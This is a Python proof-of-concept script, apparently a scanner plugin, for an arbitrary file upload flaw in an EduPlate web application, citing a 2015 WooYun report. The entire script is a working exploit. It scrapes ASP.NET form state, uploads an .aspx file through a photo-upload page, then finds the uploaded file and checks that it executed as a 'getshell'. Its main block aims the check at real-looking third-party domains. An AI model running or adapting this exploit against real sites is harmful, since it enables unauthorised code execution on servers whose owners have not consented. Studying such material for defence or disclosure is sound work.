# coding:utf-8
# title:上海鼎创信息科技有限公司某通用型任意上传导致Getshell 
# author:codier
# blog:http://www.codier.cn
# date:2015-08-10
# from:http://www.wooyun.org/bugs/wooyun-2015-0111072

import re,urlparse

def com_pack(state):
    return '''POST /EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx HTTP/1.1
Host: i.goodo.com.cn
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://i.goodo.com.cn/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------4031702637822542581177793002
Content-Length: 1073

-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="__EVENTTARGET"

lbnSubmit
-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="__EVENTARGUMENT"


-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="__VIEWSTATE"

''' + str(state[0]) + '''
-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="lbInfo"

6dd
-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="File1"; filename="codier.aspx"
Content-Type: application/octet-stream

<%@ Page Language="Jscript"%>
<%Response.Write('E327B894F7C7782B9A3CE3697556902A');%>
-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="__EVENTVALIDATION"

''' +str(state[1])+ '''
-----------------------------4031702637822542581177793002--
'''

def getViewState(url):
    code,head,res,errcode,_ = curl.curl2(url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx')
    if code == 200:
        the_list = []
        buff_list = re.findall('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)" />',res)
        the_list.append(buff_list[0])
        buff_list = re.findall('<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*?)" />',res)
        the_list.append(buff_list[0])
        return the_list

def assign(service, arg):
    if service == "eduplate":
        return True,arg

def audit(arg):
    url = arg
    buff_state = getViewState(url) #get viewstat 
    rawt = com_pack(buff_state)   #get pack
    code, head, res, errcode, _ = curl.curl2(url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx',raw = rawt)
    m = re.search('(\xcc\xe1\xbd\xbb\xb3\xc9\xb9\xa6\xa3\xa1|\xe6\x8f\x90\xe4\xba\xa4\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81)', res)
    if m:
        security_info('[upload success] ' + url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx')
    code , head, res ,errcode,_ = curl.curl2(url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAll.aspx')
    m = re.search(r"src='\.\./\.\./(.*?)'",res)
    if m :
    	code ,head ,res,errcode,_ = curl.curl2(url + '/' + m.group(1))
    	if 'E327B894F7C7782B9A3CE3697556902A' in res:
    		security_hole('[getshell success] ' + url + '/' + m.group(1))

if __name__ == '__main__':
    from dummy import *
    #getViewState('http://i.goodo.com.cn/')
    audit(assign('eduplate', 'http://smxx.ijd.cn/')[1])
    #audit(assign('EduPlate', 'http://i.goodo.com.cn/')[1])
    #audit(assign('EduPlate', 'http://www.mhhlyy.com/')[1])